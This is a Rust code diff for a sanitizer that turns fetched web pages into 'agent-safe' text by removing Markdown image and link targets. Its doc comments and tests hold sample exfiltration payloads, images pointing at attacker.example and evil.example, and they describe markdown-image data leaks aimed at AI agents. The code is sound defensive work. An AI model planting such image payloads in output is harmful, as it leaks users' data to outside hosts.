@@ -1,13 +1,14 @@
 //! Serialize extracted content into clean, agent-safe text.
 //!
-//! The output is plain text with two deliberate properties:
+//! Articles arrive as Markdown and plain-text fallbacks as text. Either way the
+//! output has two deliberate properties:
 //!
-//! - **No link or image markup survives.** A fetched page is untrusted; a
-//!   markdown image in it (`![](https://attacker/?data=…)`) is a known
-//!   exfiltration channel once a client renders it. Link text is kept, the URL
+//! - **No image markup survives.** A fetched page is untrusted; a markdown
+//!   image in it (`![](https://attacker/?data=…)`) is a known exfiltration
+//!   channel once a client renders it. Link text is kept outside code, the URL
 //!   is not.
-//! - **Whitespace is normalized** so the model reads prose, not layout, and the
-//!   text is cheap to tokenize.
+//! - **Whitespace is normalized** so the model reads prose, not layout, except
+//!   inside fenced code, where indentation is meaning.
 
 /// One extracted page: the readable text plus the metadata a caller can cite.
 #[derive(Debug, Clone, serde::Serialize)]
@@ -26,14 +27,68 @@ pub struct Page {
     pub redirect: Option<String>,
 }
 
-/// Collapse whitespace, drop empty lines runs, and neutralize any residual
-/// link or image syntax that survived extraction.
+impl Page {
+    /// A page that is only text, such as a plain-text or PDF body.
+    pub fn text(text: String) -> Self {
+        Page {
+            title: String::new(),
+            byline: None,
+            published: None,
+            site: None,
+            text,
+            redirect: None,
+        }
+    }
+}
+
+/// Normalize plain text: collapse whitespace, keep at most one blank line
+/// between paragraphs, and neutralize any residual link or image syntax.
 pub(super) fn clean(text: &str) -> String {
-    let without_targets = strip_link_targets(text);
-    let mut out = String::with_capacity(without_targets.len());
+    normalize(text, false)
+}
+
+/// Normalize Markdown from the article extractor. Headings, lists and code
+/// keep their structure: fenced code keeps its indentation, inline code keeps
+/// its characters, and punctuation escapes outside code are removed. Link
+/// targets are dropped outside code, and image syntax is neutralized
+/// everywhere, inside code too, so no reading of the output can autoload one.
+pub(super) fn markdown(text: &str) -> String {
+    normalize(text, true)
+}
+
+/// Shared line normalization for [`clean`] and [`markdown`].
+fn normalize(text: &str, markdown: bool) -> String {
+    let mut out = String::with_capacity(text.len());
     let mut blank = false;
-    for line in without_targets.lines() {
-        let line = line.split_whitespace().collect::<Vec<_>>().join(" ");
+    let mut fence: Option<char> = None;
+    for raw in text.lines() {
+        let raw = defuse_definition(raw);
+        let trimmed = raw.trim();
+        let fence_line = markdown && (trimmed.starts_with("```") || trimmed.starts_with("~~~"));
+        if let Some(marker) = fence {
+            out.push_str(&strip_targets(raw.trim_end(), false));
+            out.push('\n');
+            if fence_line && trimmed.chars().all(|c| c == marker) {
+                fence = None;
+            }
+            blank = false;
+            continue;
+        }
+        if fence_line {
+            fence = trimmed.chars().next();
+            out.push_str(&strip_targets(trimmed, false));
+            out.push('\n');
+            blank = false;
+            continue;
+        }
+        let line = trimmed.split_whitespace().collect::<Vec<_>>().join(" ");
+        let line = if markdown {
+            strip_targets(&prose(&line), false)
+        } else {
+            strip_targets(&line, true)
+        };
+        // Sphinx and similar generators append a pilcrow permalink to headings.
+        let line = line.trim_end_matches('¶').trim_end();
         if line.is_empty() {
             // At most one blank line between paragraphs.
             if !blank && !out.is_empty() {
@@ -43,82 +98,165 @@ pub(super) fn clean(text: &str) -> String {
             continue;
         }
         blank = false;
-        out.push_str(line.trim());
+        out.push_str(line);
         out.push('\n');
     }
     out.trim().to_string()
 }
 
-/// Remove markdown/HTML link and image targets, keeping the human text. This is
-/// the exfiltration guard: page content must not be able to carry a URL that a
-/// client would fetch on the model's behalf.
-fn strip_link_targets(text: &str) -> String {
-    let mut out = String::with_capacity(text.len());
-    let mut chars = text.char_indices().peekable();
-    while let Some((_, ch)) = chars.next() {
-        match ch {
-            // Markdown image: ![alt](url) -> alt. Link: [text](url) -> text.
-            '!' if chars.peek().map(|(_, c)| *c) == Some('[') => {
-                chars.next();
-                out.push_str(&take_bracketed(&mut chars, true));
+/// Process one Markdown line outside fences: inline code spans are kept
+/// verbatim; elsewhere escapes are removed first and then link and image
+/// targets dropped, so an unescaped `\![x](y)` cannot become an image.
+fn prose(line: &str) -> String {
+    let mut out = String::with_capacity(line.len());
+    for (code, segment) in code_spans(line) {
+        if code {
+            out.push_str(segment);
+        } else {
+            out.push_str(&strip_targets(&unescape(segment), true));
+        }
+    }
+    out
+}
+
+/// Split a line into `(is_code, text)` segments. A run of N backticks opens a
+/// span closed by the next run of exactly N; an unmatched or backslash-escaped
+/// run is literal text, as in CommonMark.
+fn code_spans(line: &str) -> Vec<(bool, &str)> {
+    let bytes = line.as_bytes();
+    let run_at = |at: usize| bytes.iter().skip(at).take_while(|&&b| b == b'`').count();
+    let mut segments = Vec::new();
+    let mut start = 0;
+    let mut at = 0;
+    while at < bytes.len() {
+        if bytes.get(at) != Some(&b'`') || (at > 0 && bytes.get(at - 1) == Some(&b'\\')) {
+            at += 1;
+            continue;
+        }
+        let run = run_at(at);
+        let mut close = at + run;
+        let mut found = None;
+        while close < bytes.len() {
+            if bytes.get(close) == Some(&b'`') {
+                let length = run_at(close);
+                if length == run {
+                    found = Some(close);
+                    break;
+                }
+                close += length;
+            } else {
+                close += 1;
             }
-            '[' => out.push_str(&take_bracketed(&mut chars, false)),
-            // A bare URL is not a fetch trigger for the model, but an inline
-            // image autoload is; leave bare URLs as text.
+        }
+        match found {
+            Some(end) => {
+                if let Some(before) = line.get(start..at) {
+                    segments.push((false, before));
+                }
+                if let Some(code) = line.get(at..end + run) {
+                    segments.push((true, code));
+                }
+                start = end + run;
+                at = start;
+            }
+            None => at += run,
+        }
+    }
+    if let Some(rest) = line.get(start..) {
+        segments.push((false, rest));
+    }
+    segments
+}
+
+/// Remove Markdown backslash escapes before ASCII punctuation.
+fn unescape(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut chars = text.chars().peekable();
+    while let Some(ch) = chars.next() {
+        if ch == '\\' && chars.peek().is_some_and(char::is_ascii_punctuation) {
+            continue;
+        }
+        out.push(ch);
+    }
+    out
+}
+
+/// Remove Markdown image targets, and link targets when `links` is set,
+/// keeping the human text. This is the exfiltration guard: page content must
+/// not be able to carry an image a client would fetch on the model's behalf.
+///
+/// One pass with an explicit bracket stack, so nested forms such as the badge
+/// pattern `[![alt](image)](link)` lose their inner image before the outer link
+/// is considered, and deep nesting cannot exhaust the call stack. Brackets that
+/// are not followed by `(target)` stay literal (`vec![1]`, `a[0]`); reference
+/// images cannot resolve because [`defuse_definition`] breaks every definition.
+fn strip_targets(text: &str, links: bool) -> String {
+    /// An open `[`: where its opener starts in `out`, and whether it is `![`.
+    struct Open {
+        at: usize,
+        image: bool,
+    }
+    let mut out = String::with_capacity(text.len());
+    let mut open: Vec<Open> = Vec::new();
+    let mut chars = text.chars().peekable();
+    while let Some(ch) = chars.next() {
+        match ch {
+            '[' => {
+                let image = out.ends_with('!');
+                let at = if image { out.len() - 1 } else { out.len() };
+                open.push(Open { at, image });
+                out.push('[');
+            }
+            ']' => {
+                let Some(opened) = open.pop() else {
+                    out.push(']');
+                    continue;
+                };
+                if chars.peek() != Some(&'(') || !(opened.image || links) {
+                    out.push(']');
+                    continue;
+                }
+                // `[text](target)` or `![alt](target)`: drop the opener, the
+                // closing bracket and the balanced target; keep the text.
+                chars.next();
+                let mut depth = 1usize;
+                for c in chars.by_ref() {
+                    match c {
+                        '(' => depth += 1,
+                        ')' => {
+                            depth -= 1;
+                            if depth == 0 {
+                                break;
+                            }
+                        }
+                        _ => {}
+                    }
+                }
+                let opener = if opened.image { 2 } else { 1 };
+                out.replace_range(opened.at..opened.at + opener, "");
+            }
             c => out.push(c),
         }
     }
     out
 }
 
-/// Consume `[text](target)` starting after the `[`, returning `text`. When the
-/// shape does not match, preserve literal brackets except for image-like syntax,
-/// which is still neutralized to prevent reference-style image autoloading.
-fn take_bracketed(
-    chars: &mut std::iter::Peekable<std::str::CharIndices<'_>>,
-    image: bool,
-) -> String {
-    let mut text = String::new();
-    let mut depth = 1usize;
-    for (_, c) in chars.by_ref() {
-        match c {
-            '[' => {
-                depth += 1;
-                text.push(c);
-            }
-            ']' => {
-                depth -= 1;
-                if depth == 0 {
-                    break;
-                }
-                text.push(c);
-            }
-            _ => text.push(c),
+/// Break a Markdown link reference definition (`[label]: url`, possibly inside
+/// quote or list markers) by separating the colon, so no reference-style link
+/// or image elsewhere in the page can resolve to a URL.
+fn defuse_definition(line: &str) -> std::borrow::Cow<'_, str> {
+    let body = line.trim_start_matches(|c: char| {
+        c.is_whitespace() || matches!(c, '>' | '-' | '*' | '+' | '.' | ')') || c.is_ascii_digit()
+    });
+    if body.starts_with('[') {
+        if let Some(close) = body.find("]:") {
+            let at = line.len() - body.len() + close + 1;
+            let mut defused = line.to_string();
+            defused.insert(at, ' ');
+            return std::borrow::Cow::Owned(defused);
         }
     }
-    // Consume an immediately following `(target)`.
-    if depth == 0 && chars.peek().map(|(_, c)| *c) == Some('(') {
-        chars.next();
-        let mut paren = 1usize;
-        for (_, c) in chars.by_ref() {
-            match c {
-                '(' => paren += 1,
-                ')' => {
-                    paren -= 1;
-                    if paren == 0 {
-                        break;
-                    }
-                }
-                _ => {}
-            }
-        }
-        return text;
-    }
-    if image {
-        return text;
-    }
-    let suffix = if depth == 0 { "]" } else { "" };
-    format!("[{text}{suffix}")
+    std::borrow::Cow::Borrowed(line)
 }
 
 #[cfg(test)]
@@ -159,15 +297,70 @@ mod tests {
         assert_eq!(clean("s1[0] and values[index]"), "s1[0] and values[index]");
         assert_eq!(
             clean("[nested [label]] ![literal] [unfinished"),
-            "[nested [label]] literal [unfinished"
+            "[nested [label]] ![literal] [unfinished"
+        );
+        assert_eq!(
+            markdown("```\n#![allow(unused)]\nlet v = vec![1, 2];\n```"),
+            "```\n#![allow(unused)]\nlet v = vec![1, 2];\n```"
         );
     }
 
     #[test]
-    fn reference_images_stay_neutralized_when_literal_brackets_are_preserved() {
+    /// Reference images stay literal because every definition is broken, in
+    /// plain text, Markdown, quotes and lists alike.
+    fn reference_definitions_are_broken() {
         assert_eq!(
             clean("![pixel][target]\n[target]: https://attacker.example/pixel"),
-            "pixel[target]\n[target]: https://attacker.example/pixel"
+            "![pixel][target]\n[target] : https://attacker.example/pixel"
         );
+        for line in [
+            "  [t]: https://a.example/x",
+            "> [t]: https://a.example/x",
+            "- [t]: <https://a.example/x>",
+        ] {
+            assert!(markdown(line).contains("] :"), "{line}");
+        }
+    }
+
+    /// Images nested in links or brackets — the README badge pattern — and
+    /// pathological nesting are neutralized without recursion.
+    #[test]
+    fn nested_images_are_neutralized() {
+        assert_eq!(
+            markdown("[![build](https://img.example/badge.svg)](https://ci.example) and [![a](https://evil.example)]"),
+            "build and [a]"
+        );
+        let deep = format!(
+            "{}![x](https://evil.example){}",
+            "[".repeat(100_000),
+            "]".repeat(100_000)
+        );
+        assert!(!markdown(&deep).contains("]("));
+    }
+
+    /// Fenced code keeps indentation and literal brackets; prose loses escapes.
+    #[test]
+    fn markdown_code_keeps_its_shape() {
+        let input = "## 4\\.1\\. `if` Statements¶\n\n```\nfor x in xs:\n    call(a[0](x))\n```\n\nUse `a[0](x)` \\(see [docs](https://example.com)\\)\\.";
+        assert_eq!(
+            markdown(input),
+            "## 4.1. `if` Statements\n\n```\nfor x in xs:\n    call(a[0](x))\n```\n\nUse `a[0](x)` (see docs)."
+        );
+    }
+
+    /// Images are neutralized in code and after unescaping, and an escaped or
+    /// unmatched backtick cannot hide one inside a fake code span.
+    #[test]
+    fn markdown_images_never_survive() {
+        for input in [
+            "```\n![x](https://attacker.example/a)\n```",
+            "`![x](https://attacker.example/b)`",
+            "\\![x\\](https://attacker.example/c)",
+            "\\`x ![y](https://attacker.example/d) `",
+            "`x ![y](https://attacker.example/e)",
+        ] {
+            let output = markdown(input);
+            assert!(!output.contains("]("), "{input:?} -> {output:?}");
+        }
     }
 }
